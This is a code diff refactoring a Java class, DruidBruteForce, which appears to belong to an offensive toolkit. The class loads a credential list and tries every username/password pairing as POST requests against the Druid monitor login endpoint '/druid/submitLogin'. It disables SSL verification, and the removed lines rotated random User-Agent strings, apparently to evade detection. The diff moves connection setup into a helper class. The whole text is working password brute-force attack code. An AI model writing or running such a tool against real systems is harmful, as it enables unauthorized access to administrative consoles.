@@ -1,16 +1,15 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.stream.Stream;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class DruidBruteForce {
     String address;
@@ -30,7 +29,7 @@ public class DruidBruteForce {
         try (BufferedReader br = new BufferedReader(new FileReader(file))) {
             String line;
             while ((line = br.readLine()) != null) {
-                credentials.add(line.trim());  // 去除每行的空格并添加到列表
+                credentials.add(line.trim());
             }
         }
     }
@@ -44,19 +43,13 @@ public class DruidBruteForce {
         String api = "/druid/submitLogin";
         String res = "";
         String site = address + api;
-        String ua = "";
         // 遍历用户名和密码进行爆破
         for (String username : credentials) {
             for (String password : credentials) {
                 String postData = "loginUsername=" + URLEncoder.encode(username, "UTF-8") +
                         "&loginPassword=" + URLEncoder.encode(password, "UTF-8");
                 // 发送POST数据
-                URL obj = new URL(site);
-                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-                UA_Config uacf = new UA_Config();
-                List<String> ualist = uacf.loadUserAgents();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn = HTTPConfig.createConnection(site);
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
